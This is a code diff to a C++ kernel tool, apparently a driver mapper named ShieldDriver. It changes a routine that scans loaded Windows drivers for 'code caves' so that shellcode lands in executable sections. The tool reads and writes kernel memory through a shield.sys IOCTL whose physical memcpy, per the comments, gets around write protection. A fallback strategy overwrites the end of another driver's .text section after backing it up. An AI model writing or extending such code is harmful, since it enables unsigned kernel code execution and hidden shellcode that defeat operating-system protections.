@@ -110,7 +110,9 @@ namespace ShieldDriver {
         DWORD count = needed / sizeof(LPVOID);
         printf("[*] Scanning %lu loaded drivers for code caves...\n", count);
 
-        // === STRATEGY A: Natural slack in writable sections ===
+        // === STRATEGY A: Executable sections with slack (CRITICAL: code must run!) ===
+        // Note: shield.sys IOCTL uses physical memcpy, bypassing page write protection.
+        // So we only need EXECUTE, not WRITE, for shellcode execution.
         for (DWORD drvIdx = 0; drvIdx < count; drvIdx++) {
             uint64_t base = (uint64_t)drivers[drvIdx];
             if (!base || base < 0xFFFF000000000000ULL) continue;
@@ -128,16 +130,17 @@ namespace ShieldDriver {
                 IMAGE_SECTION_HEADER sec{};
                 if (!ReadKernel(hDevice, secOff + s * sizeof(sec), &sec, sizeof(sec))) continue;
                 
-                // Must be writable (for shellcode we need RW, execution is separate)
-                if (!(sec.Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
+                // MUST be executable for HDT shellcode! (fix: BSOD from NX violation)
+                // ShieldMapper writes via physical memcpy, so write-protection doesn't block us
+                if (!(sec.Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
                 
-                // Check for slack: raw size > virtual size
+                // Check for slack: raw size > virtual size (padding/alignment bytes)
                 if (sec.SizeOfRawData <= sec.Misc.VirtualSize + 128) continue;
                 
                 uint64_t caveAddr = base + sec.VirtualAddress + sec.Misc.VirtualSize;
                 uint64_t slackSize = sec.SizeOfRawData - sec.Misc.VirtualSize;
                 
-                // Verify at least 128 bytes are empty (zero or CC)
+                // Verify at least 128 bytes are empty (zero or CC - common padding values)
                 uint8_t probe[128]{};
                 if (!ReadKernel(hDevice, caveAddr, probe, sizeof(probe))) continue;
                 
@@ -147,17 +150,16 @@ namespace ShieldDriver {
                 }
                 
                 if (empty) {
-                    // Get driver name for debug
                     char drvName[MAX_PATH]{};
                     GetDeviceDriverBaseNameA(drivers[drvIdx], drvName, sizeof(drvName));
-                    printf("[+] Codecave: %s +0x%llX (%s) slack=%llu bytes\n", 
+                    printf("[+] Codecave: %s +0x%llX (%s) slack=%llu bytes [EXECUTABLE]\n", 
                            drvName, caveAddr - base, (char*)sec.Name, slackSize);
                     return caveAddr;
                 }
             }
         }
 
-        // === STRATEGY B: Use writable section end with data backup ===
+        // === STRATEGY B: Executable section end with data backup ===
         printf("[*] Strategy A failed, trying Strategy B (backup/restore)...\n");
         
         for (DWORD drvIdx = 0; drvIdx < count; drvIdx++) {
@@ -176,22 +178,21 @@ namespace ShieldDriver {
                 IMAGE_SECTION_HEADER sec{};
                 if (!ReadKernel(hDevice, secOff + s * sizeof(sec), &sec, sizeof(sec))) continue;
                 
-                if (!(sec.Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
+                // MUST be executable! Backup data at end of .text section
+                if (!(sec.Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
                 
-                // Use the last 256 bytes of any writable section
+                // Use the last 256 bytes of the executable section
                 uint64_t caveAddr = base + sec.VirtualAddress + sec.Misc.VirtualSize - 256;
-                
-                // Make sure caveAddr is within the raw data
                 uint64_t rawEnd = base + sec.VirtualAddress + sec.SizeOfRawData;
                 if (caveAddr + 256 > rawEnd) continue;
                 if (caveAddr < base + sec.VirtualAddress) continue;
                 
-                // Backup the original data
+                // Backup original data before overwriting
                 if (!ReadKernel(hDevice, caveAddr, g_backupData, 256)) continue;
                 
                 char drvName[MAX_PATH]{};
                 GetDeviceDriverBaseNameA(drivers[drvIdx], drvName, sizeof(drvName));
-                printf("[+] Codecave (B): %s +0x%llX (%s) [backup/restore]\n",
+                printf("[+] Codecave (B): %s +0x%llX (%s) [backup/restore, EXECUTABLE]\n",
                        drvName, caveAddr - base, (char*)sec.Name);
                 
                 g_backupCave = caveAddr;
